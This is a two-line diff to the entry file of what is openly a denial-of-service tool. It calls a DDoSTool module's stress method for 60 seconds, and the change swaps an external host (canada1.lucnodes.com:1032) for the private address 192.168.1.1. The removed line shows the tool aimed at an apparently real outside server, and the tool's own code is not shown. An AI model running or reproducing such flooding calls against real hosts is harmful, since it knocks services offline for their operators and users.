@@ -1,2 +1,2 @@
 const DDoSTool = require("./src/main");
-new DDoSTool("http://canada1.lucnodes.com:1032/").stress(60)
+new DDoSTool("http://192.168.1.1/").stress(60)
